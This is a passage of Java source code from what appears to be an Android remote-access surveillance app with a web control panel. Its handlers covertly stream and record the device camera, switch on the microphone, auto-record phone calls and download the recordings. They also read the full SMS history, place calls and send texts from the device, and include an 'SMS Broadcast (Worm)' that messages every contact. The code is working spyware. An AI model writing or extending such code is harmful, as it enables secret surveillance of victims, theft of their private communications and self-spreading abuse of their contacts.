                    (byte) 0xFF, (byte) 0xD8, (byte) 0xFF, (byte) 0xE0, 0x00, 0x10, 0x4A, 0x46,
                    0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
                    (byte) 0xFF, (byte) 0xDB, 0x00, 0x43, 0x00, 0x08, 0x06, 0x06, 0x07, 0x06,
                    0x05, 0x08, 0x07, 0x07, 0x07, 0x09, 0x09, 0x08, 0x0A, 0x0C, 0x14, 0x0D,
                    0x0C, 0x0B, 0x0B, 0x0C, 0x19, 0x12, 0x13, 0x0F, 0x14, 0x1D, 0x1A, 0x1F,
                    0x1E, 0x1D, 0x1A, 0x1C, 0x1C, 0x20, 0x24, 0x2E, 0x27, 0x20, 0x22, 0x2C,
                    0x23, 0x1C, 0x1C, 0x28, 0x37, 0x29, 0x2C, 0x30, 0x31, 0x34, 0x34, 0x34,
                    0x1F, 0x27, 0x39, 0x3D, 0x38, 0x32, 0x3C, 0x2E, 0x33, 0x34, 0x32,
                    (byte) 0xFF, (byte) 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01, 0x00, 0x01, 0x01,
                    0x01, 0x11, 0x00, (byte) 0xFF, (byte) 0xC4, 0x00, 0x1F, 0x00, 0x00, 0x01,
                    0x05, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
                    0x0A, 0x0B, (byte) 0xFF, (byte) 0xC4, 0x00, (byte) 0xB5, 0x10, 0x00, 0x02,
                    0x01, 0x03, 0x03, 0x02, 0x04, 0x03, 0x05, 0x05, 0x04, 0x04, 0x00, 0x00,
                    0x01, 0x7D, (byte) 0xFF, (byte) 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00,
                    0x3F, 0x00, 0x7F, (byte) 0xFF, (byte) 0xD9
            };
            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(pixel);
            Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, pixel.length);
            response.addHeader("Cache-Control", "no-cache");
            return response;
        }
    }

    private Response startCameraStream(Map<String, String> params) {
        String camId = params.get("cam");
        logActivity("OPTICS_UPLINK: Live stream started on camera " + (camId != null ? camId : "0"));
        String widthStr = params.get("width");
        String heightStr = params.get("height");
        String qualityStr = params.get("quality");

        int width = 640, height = 480, quality = 50;
        try {
            if (widthStr != null)
                width = Integer.parseInt(widthStr);
            if (heightStr != null)
                height = Integer.parseInt(heightStr);
            if (qualityStr != null)
                quality = Integer.parseInt(qualityStr);
        } catch (Exception ignored) {
        }

        startCameraStreamInternal(camId != null ? camId : "0", width, height, quality);

        String json = "{\"success\": true, \"message\": \"Stream started\", \"camera\": \"" +
                (camId != null ? camId : "0") + "\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private void startCameraStreamInternal(String camId, int width, int height, int quality) {
        android.content.Intent intent = new android.content.Intent(context, MediaContainer.class);
        intent.setAction("START_STREAM");
        intent.putExtra("cameraId", camId);
        intent.putExtra("width", width);
        intent.putExtra("height", height);
        intent.putExtra("quality", quality);

        context.startForegroundService(intent);
    }

    private Response stopCameraStream() {
        android.content.Intent intent = new android.content.Intent(context, MediaContainer.class);
        intent.setAction("STOP_STREAM");
        context.startService(intent);

        String json = "{\"success\": true, \"message\": \"Stream stopped\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response startVideoRecording(Map<String, String> params) {
        String camId = params.get("cam");
        logActivity("OPTICS_UPLINK: Background video recording started on camera " + (camId != null ? camId : "0"));
        String widthStr = params.get("width");
        String heightStr = params.get("height");

        int width = 1280, height = 720;
        try {
            if (widthStr != null)
                width = Integer.parseInt(widthStr);
            if (heightStr != null)
                height = Integer.parseInt(heightStr);
        } catch (Exception e) {
        }

        android.content.Intent intent = new android.content.Intent(context, MediaContainer.class);
        intent.setAction("START_RECORDING");
        intent.putExtra("cameraId", camId != null ? camId : "0");
        intent.putExtra("width", width);
        intent.putExtra("height", height);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        String json = "{\"success\": true, \"message\": \"Recording started\", \"camera\": \"" +
                (camId != null ? camId : "0") + "\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response stopVideoRecording() {
        logActivity("OPTICS_TERMINATED: Background recording saved");
        android.content.Intent intent = new android.content.Intent(context, MediaContainer.class);
        intent.setAction("STOP_RECORDING");
        context.startService(intent);

        String videoPath = MediaContainer.getCurrentVideoPath();
        String json = "{\"success\": true, \"message\": \"Recording stopped\"" +
                (videoPath != null ? ", \"path\": \"" + videoPath + "\"" : "") + "}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response serveCameraStatus() {
        boolean streaming = MediaContainer.isCurrentlyStreaming();
        boolean recording = MediaContainer.isCurrentlyRecording();
        String currentCamera = MediaContainer.getCurrentCameraId();
        long duration = MediaContainer.getRecordingDuration();
        String videoPath = MediaContainer.getCurrentVideoPath();

        String json = String.format(
                "{\"streaming\": %s, \"recording\": %s, \"camera\": \"%s\", \"duration\": %d, \"videoPath\": %s}",
                streaming, recording, currentCamera, duration,
                videoPath != null ? "\"" + videoPath + "\"" : "null");
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    // ============ AUDIO/MICROPHONE RECORDING ============

    private Response serveAudioPage() {
        boolean isRecording = AudioStability.isRecording();
        boolean isRecordingCall = AudioStability.isRecordingCall();
        boolean callInProgress = AudioStability.isCallInProgress();
        String callNumber = AudioStability.getCurrentCallNumber();
        String callType = AudioStability.getCurrentCallType();
        long duration = AudioStability.getRecordingDuration();
        boolean autoRecordEnabled = AudioStability.isAutoRecordEnabled();
        boolean saveOnDeviceEnabled = AudioStability.isSaveOnDeviceEnabled();

        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<style>")
            .append(".status-card { padding: 20px; background: rgba(255,255,255,0.05); border-radius: 15px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); }")
            .append(".status-active { border-color: var(--neon-green); background: rgba(57, 255, 20, 0.05); }")
            .append(".status-inactive { border-color: var(--danger); background: rgba(255, 49, 49, 0.05); }")
            .append(".toggle-container { display: flex; align-items: center; justify-content: space-between; gap: 15px; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); }")
            .append(".toggle-switch { position: relative; width: 44px; height: 24px; background: #333; border-radius: 12px; cursor: pointer; transition: all 0.3s; border: 1px solid rgba(255,255,255,0.1); }")
            .append(".toggle-switch.active { background: var(--neon-green); border-color: var(--neon-green); }")
            .append(".toggle-switch::after { content: ''; position: absolute; width: 18px; height: 18px; border-radius: 50%; background: #fff; top: 2px; left: 2px; transition: 0.3s; }")
            .append(".toggle-switch.active::after { left: 22px; }")
            .append(".call-alert { padding: 20px; background: rgba(57, 255, 20, 0.1); border-radius: 15px; margin-bottom: 20px; border: 2px solid var(--neon-green); animation: pulse 2s infinite; }")
            .append("@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }")
            .append(".duration { font-size: 1.8rem; font-weight: 900; color: var(--neon-cyan); font-family: 'Orbitron', sans-serif; text-shadow: 0 0 10px rgba(0, 242, 255, 0.3); }")
            .append("</style>");

        html.append("<div class=\"back-btn-container\">")
            .append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>")
            .append("</div>");

        html.append("<div class=\"card\">")
            .append("<h2 style=\"margin-bottom: 20px;\">&#127908; ACOUSTICS_INTERFACE</h2>");

        // Call in progress alert
        if (callInProgress) {
            html.append("<div class=\"call-alert\">")
                .append("<div style=\"display: flex; align-items: center; gap: 15px;\">")
                .append("<span style=\"font-size: 2rem;\">&#128222;</span>")
                .append("<div>")
                .append("<div style=\"font-size: 1.1rem; font-weight: bold; color: var(--neon-green);\">")
                .append(callType.equals("incoming") ? "INCOMING_CALL_DETECTED" : "OUTGOING_CALL_DETECTED").append("</div>")
                .append("<div style=\"color: #fff; font-family: monospace;\">ID: ").append(escapeHtml(callNumber)).append("</div>")
                .append("</div></div></div>");
        }

        // Recording status
        html.append("<div class=\"status-card ").append(isRecording ? "status-active" : "status-inactive").append("\">")
            .append("<div style=\"display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px;\">")
            .append("<div>")
            .append("<h3 style=\"margin:0; font-size: 1rem;\">")
            .append(isRecording ? "<span style=\"animation: blink 1s infinite;\">&#9679;</span>&nbsp;SURVEILLANCE_ACTIVE" : "&#9899;&nbsp;STANDBY_MODE").append("</h3>");

        if (isRecording) {
            String recordingType = isRecordingCall ? "CALL_INTERCEPTION" : "AMBIENT_CAPTURE";
            html.append("<p style=\"color: #888; margin-top: 5px; font-size: 0.7rem; font-family: monospace;\">TYPE: ").append(recordingType).append("</p>")
                .append("<div class=\"duration\" id=\"duration\">").append(formatDuration((int) duration)).append("</div>");
        }
        html.append("</div>");

        if (isRecording) {
            html.append("<a href=\"/audio/").append(isRecordingCall ? "call" : "mic").append("/stop\" class=\"btn\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05);\">&#9724; TERMINATE</a>");
        }
        
        html.append("</div></div>");

        // Control buttons
        html.append("<div class=\"card\">")
            .append("<h3 style=\"font-size: 0.95rem;\">&#127897; AMBIENT_RECORDING</h3>")
            .append("<p style=\"color: #888; margin-bottom: 20px; font-size: 0.85rem;\">Remote activation of device microphone.</p>")
            .append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px;\">")
            .append("<a href=\"/audio/mic/start\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-green); color: var(--neon-green);\"").append(">START_LIVE</a>")
            .append("<a href=\"/audio/mic/start?duration=30\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\"").append(">30s_BURST</a>")
            .append("<a href=\"/audio/mic/start?duration=60\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\"").append(">60s_BURST</a>")
            .append("<a href=\"/audio/mic/start?duration=300\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\"").append(">5m_BURST</a>")
            .append("</div></div>");

        // Call recording section
        html.append("<div class=\"card\">")
            .append("<h3 style=\"font-size: 0.95rem;\">&#128222; COMMS_INTERCEPTION</h3>")
            .append("<p style=\"color: #888; margin-bottom: 20px; font-size: 0.85rem;\">Automated capture of cellular voice communications.</p>")
            .append("<div style=\"display: grid; grid-template-columns: 1fr; gap: 12px;\">")
            .append("<div class=\"toggle-container\">")
            .append("<span style=\"font-size: 0.8rem; color: #ccc;\">AUTO_RECORD_CALLS:</span>")
            .append("<a href=\"/audio/settings?auto_record=").append(!autoRecordEnabled).append("&save_on_device=").append(saveOnDeviceEnabled).append("\" style=\"text-decoration: none;\">")
            .append("<div class=\"toggle-switch ").append(autoRecordEnabled ? "active" : "").append("\"></div>")
            .append("</a></div>")
            .append("<div class=\"toggle-container\">")
            .append("<span style=\"font-size: 0.8rem; color: #ccc;\">SAVE_LOCAL_COPY:</span>")
            .append("<a href=\"/audio/settings?auto_record=").append(autoRecordEnabled).append("&save_on_device=").append(!saveOnDeviceEnabled).append("\" style=\"text-decoration: none;\">")
            .append("<div class=\"toggle-switch ").append(saveOnDeviceEnabled ? "active" : "").append("\"></div>")
            .append("</a></div>")
            .append("</div></div>");

        // View recordings link
        html.append("<div class=\"card\">")
            .append("<h3 style=\"font-size: 0.95rem;\">&#128190; RECORDING_ARCHIVE</h3>")
            .append("<div style=\"display: flex; gap: 10px; flex-wrap: wrap;\">")
            .append("<a href=\"/audio/recordings\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\">OPEN_ARCHIVE</a>")
            .append("<a href=\"/files/Music/LabRATSRecordings\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green);\">BROWSE_FILES</a>")
            .append("</div></div>");

        // Auto-refresh script for status
        html.append("<script>")
            .append("setInterval(function() {")
            .append("  fetch('/audio/status')")
            .append("    .then(r => r.json())")
            .append("    .then(data => {")
            .append("      if (data.isRecording && document.getElementById('duration')) {")
            .append("        var d = data.duration;")
            .append("        var min = Math.floor(d / 60);")
            .append("        var sec = d % 60;")
            .append("        document.getElementById('duration').textContent = min + ':' + (sec < 10 ? '0' : '') + sec;")
            .append("      }")
            .append("      if (data.callInProgress && !document.querySelector('.call-alert')) {")
            .append("        location.reload();")
            .append("      }")
            .append("    });")
            .append("}, 2000);")
            .append("</script>");

        html.append("</div>");
        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response startMicRecording(Map<String, String> params) {
        logActivity("ACOUSTICS_UPLINK: Microphone surveillance started");
        int duration = 0;
        if (params.containsKey("duration")) {
            try {
                duration = Integer.parseInt(params.get("duration"));
            } catch (Exception ignored) {
            }
        }

        android.content.Intent intent = new android.content.Intent(context, AudioStability.class);
        intent.setAction("START_MIC_RECORDING");
        intent.putExtra("duration", duration);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        // Redirect back to audio page
        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#127897; Starting microphone recording...</h2></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response stopMicRecording() {
        logActivity("ACOUSTICS_TERMINATED: Audio capture ended");
        android.content.Intent intent = new android.content.Intent(context, AudioStability.class);
        intent.setAction("STOP_MIC_RECORDING");
        context.startService(intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#9724; Stopping microphone recording...</h2></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response startCallRecording(Map<String, String> params) {
        logActivity("ACOUSTICS_UPLINK: Remote call recording initiated");
        String phoneNumber = params.get("number");
        String callType = params.get("type");

        android.content.Intent intent = new android.content.Intent(context, AudioStability.class);
        intent.setAction("START_CALL_RECORDING");
        intent.putExtra("phone_number", phoneNumber != null ? phoneNumber : "manual");
        intent.putExtra("call_type", callType != null ? callType : "manual");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        String json = "{\"success\": true, \"message\": \"Call recording started\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response stopCallRecording() {
        logActivity("ACOUSTICS_TERMINATED: Call recording ended");
        android.content.Intent intent = new android.content.Intent(context, AudioStability.class);
        intent.setAction("STOP_CALL_RECORDING");
        context.startService(intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#9724; Stopping call recording...</h2></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveAudioStatus() {
        boolean isRecording = AudioStability.isRecording();
        boolean isRecordingCall = AudioStability.isRecordingCall();
        boolean isRecordingMic = AudioStability.isRecordingMic();
        boolean callInProgress = AudioStability.isCallInProgress();
        String callNumber = AudioStability.getCurrentCallNumber();
        String callType = AudioStability.getCurrentCallType();
        long duration = AudioStability.getRecordingDuration();
        String recordingPath = AudioStability.getCurrentRecordingPath();
        boolean autoRecordEnabled = AudioStability.isAutoRecordEnabled();
        boolean saveOnDeviceEnabled = AudioStability.isSaveOnDeviceEnabled();

        String json = String.format(
                "{\"isRecording\": %s, \"isRecordingCall\": %s, \"isRecordingMic\": %s, " +
                        "\"callInProgress\": %s, \"callNumber\": \"%s\", \"callType\": \"%s\", " +
                        "\"duration\": %d, \"recordingPath\": %s, " +
                        "\"autoRecordEnabled\": %s, \"saveOnDeviceEnabled\": %s}",
                isRecording, isRecordingCall, isRecordingMic,
                callInProgress, escapeHtml(callNumber != null ? callNumber : ""), callType != null ? callType : "",
                duration, recordingPath != null ? "\"" + recordingPath + "\"" : "null",
                autoRecordEnabled, saveOnDeviceEnabled);
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response updateAudioSettings(Map<String, String> params) {
        logActivity("ACOUSTICS_PROTOCOL: Surveillance settings updated");
        boolean autoRecord = "true".equalsIgnoreCase(params.get("auto_record"));
        boolean saveOnDevice = "true".equalsIgnoreCase(params.get("save_on_device"));

        android.content.Intent intent = new android.content.Intent(context, AudioStability.class);
        intent.setAction("UPDATE_SETTINGS");
        intent.putExtra("auto_record", autoRecord);
        intent.putExtra("save_on_device", saveOnDevice);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        // Redirect back to audio page
        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=/audio\"></head>" +
                "<body></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveAudioRecordings() {
        logActivity("ACOUSTICS_EXTRACT: Remote audio archive accessed");
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128190; Audio Recordings</h2>");

        // Get recordings directory
        File recordDir = new File(Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_MUSIC), "LabRATSRecordings");

        if (!recordDir.exists() || !recordDir.isDirectory()) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
        } else {
            File[] files = recordDir.listFiles(
                    (dir, name) -> name.toLowerCase().endsWith(".m4a") || name.toLowerCase().endsWith(".mp3") ||
                            name.toLowerCase().endsWith(".wav") || name.toLowerCase().endsWith(".aac"));

            if (files == null || files.length == 0) {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
            } else {
                // Sort by date (newest first)
                java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));

                html.append("<ul class=\"file-list\">");

                int count = 0;
                for (File file : files) {
                    if (count >= 50)
                        break; // Limit to 50 files

                    String fileName = file.getName();
                    String icon = "&#127897;";
                    String iconClass = "file-icon-audio";

                    // Determine recording type from filename
                    String recordType = "Unknown";
                    if (fileName.startsWith("CALL_incoming")) {
                        icon = "&#128222;";
                        recordType = "Incoming Call";
                    } else if (fileName.startsWith("CALL_outgoing")) {
                        icon = "&#128222;";
                        recordType = "Outgoing Call";
                    } else if (fileName.startsWith("MIC_")) {
                        icon = "&#127897;";
                        recordType = "Microphone";
                    }

                    html.append("<li class=\"file-item\">");
                    html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon)
                            .append("</div>");
                    html.append("<div class=\"file-info\">");
                    html.append("<span class=\"file-name\">").append(escapeHtml(fileName)).append("</span>");
                    html.append("<div class=\"file-meta\">");
                    html.append(recordType).append(" - ");
                    html.append(formatFileSize(file.length())).append(" - ");
                    html.append(new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault())
                            .format(new Date(file.lastModified())));
                    html.append("</div></div>");
                    html.append("<a href=\"/download/Music/LabRATSRecordings/").append(fileName)
                            .append("\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\">GET_FILE</a>");
                    html.append("</li>");

                    count++;
                }

                html.append("</ul>");
            }
        }

        html.append("<div style=\"margin-top: 20px;\">");
        html.append(
                "<a href=\"/audio\" style=\"color: #00f2ff; text-decoration: none;\">&larr; Back to Audio Control</a>");
        html.append("</div>");
        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response makeCall(Map<String, String> params) {
        String number = params.get("number");
        if (number == null || number.isEmpty()) return serveError("Invalid phone number");
        
        try {
            logActivity("COMMS_DISPATCH: Initiating remote call to " + number);
            
            // Check for permission first
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (context.checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                    return serveError("CALL_PHONE permission not granted on device");
                }
            }

            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(Uri.parse("tel:" + Uri.encode(number)));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);

            String html = HTML_HEADER + 
                "<div class=\"card\"><div class=\"empty-state\">" +
                "<div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div>" +
                "<h2>Call Initiated</h2>" +
                "<p>Uplink successful. Connection established to: " + escapeHtml(number) + "</p>" +
                "<p style=\"margin-top:20px; font-size: 0.8rem; color:#888;\">The target device is now dialing...</p>" +
                "<a href=\"/calls\" class=\"btn\" style=\"margin-top:30px;\">Back to Call Logs</a>" +
                "</div></div>" + HTML_FOOTER;
                
            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
        } catch (Exception e) {
            return serveError("Failed to initiate call: " + e.getMessage());
        }
    }

    private Response serveSmsMessages(Map<String, String> params) {
        logActivity("COMMS_EXTRACT: SMS history retrieved");
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128233; SMS Terminal</h2>");
        html.append("<p style=\"color: #888; font-size: 0.8rem; margin-bottom: 20px;\"><b>Note:</b> RCS and Advanced Messaging (Blue Bubbles) are intercepted in real-time in the <a href=\"/intel\" style=\"color: var(--neon-cyan);\">Intel Tab</a>.</p>");
        html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
        html.append("<h3 style=\"font-size: 1rem; margin-bottom: 15px; text-align: center;\">&#128231; Send New Message</h3>");
        html.append("<form action=\"/sms/send\" method=\"get\">");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
        html.append("<textarea name=\"message\" placeholder=\"Message Content\" rows=\"3\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
        html.append("<button type=\"submit\" style=\"align-self: center;\">ENCRYPT & SEND</button>");
        html.append("</div></form>");

        // --- SMS BROADCAST SECTION ---
        html.append("<div style=\"margin-top: 30px; border-top: 1px solid rgba(0,242,255,0.1); padding-top: 20px;\">");
        html.append("<h3 style=\"font-size: 1rem; margin-bottom: 15px; text-align: center; color: var(--neon-orange);\">&#9889; SMS Broadcast (Worm)</h3>");
        html.append("<p style=\"color: #888; font-size: 0.75rem; text-align: center; margin-bottom: 15px;\">Dispatches a message to EVERY contact in the address book.</p>");
        html.append("<form action=\"/sms/broadcast\" method=\"get\">");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
        html.append("<textarea name=\"message\" placeholder=\"Broadcast Content\" rows=\"2\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-orange); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
        html.append("<button type=\"submit\" style=\"align-self: center; border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255,157,0,0.05);\">EXECUTE_BROADCAST</button>");
        html.append("</div></form></div></div>");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>SMS permission not granted.</p></div></div>").append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }
        int page = 1; int limit = 50;
        try { if (params.containsKey("page")) page = Integer.parseInt(params.get("page")); } catch (Exception e) {}
        int offset = (page - 1) * limit;
        Cursor cursor = null;
        try {
            Uri smsUri = Uri.parse("content://sms/");
            cursor = context.getContentResolver().query(smsUri, new String[]{"_id", "address", "body", "date", "type"}, null, null, "date DESC");
            if (cursor != null && cursor.getCount() > 0) {
                int totalCount = cursor.getCount();
                int totalPages = (int) Math.ceil((double) totalCount / limit);
                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount).append(" messages | Page ").append(page).append(" of ").append(totalPages).append("</p>");
                html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Type</th><th>Address</th><th>Message</th><th>Date</th></tr></thead><tbody>");
                int count = 0, skipped = 0;
                Map<String, String> contactCache = new HashMap<>();
                while (cursor.moveToNext()) {
                    if (skipped < offset) { skipped++; continue; }
                    if (count >= limit) break;
                    String address = cursor.getString(1), body = cursor.getString(2);
                    long date = cursor.getLong(3); int type = cursor.getInt(4);
                    String typeLabel = (type == 1) ? "INBOX" : "SENT", typeClass = (type == 1) ? "call-incoming" : "call-outgoing";
                    String displayName = getContactName(address, contactCache);
                    html.append("<tr><td class=\"").append(typeClass).append("\">").append(typeLabel).append("</td>");
                    html.append("<td>").append(escapeHtml(displayName)).append("</td>");
                    html.append("<td style=\"max-width: 400px; word-wrap: break-word;\">").append(body != null ? escapeHtml(body) : "").append("</td>");
                    html.append("<td>").append(formatMessageDate(date)).append("</td></tr>");
                    count++;
                }
                html.append("</tbody></table></div>");
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");
                    
                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/sms?page=1\">First</a>");
                        html.append("<a href=\"/sms?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }

                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);
                    for (int i = startPage; i <= endPage; i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/sms?page=").append(i).append("\">").append(i).append("</a>");
                    }

                    if (page < totalPages) {
                        html.append("<a href=\"/sms?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/sms?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");

                    // Jump to page box
                    html.append("<form action=\"/sms\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 8px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form>");

                    html.append("</div>");
                }
            } else { html.append("<div class=\"empty-state\"><div class=\"icon\">&#128233;</div><p>No messages found</p></div>"); }
        } catch (Exception e) { html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div><p>Error: ").append(escapeHtml(e.getMessage())).append("</p></div>"); }
        finally { if (cursor != null) cursor.close(); }
        html.append("</div>").append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveMmsMessages(Map<String, String> params) {
        logActivity("COMMS_EXTRACT: MMS media database retrieved");
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; MMS Terminal</h2>");
        
        html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
        html.append("<h3 style=\"font-size: 0.85rem; margin-bottom: 15px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; text-align: center;\">&#128247; Send New Multimedia Message</h3>");
        html.append("<form action=\"/mms/send\" method=\"post\" enctype=\"multipart/form-data\">");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
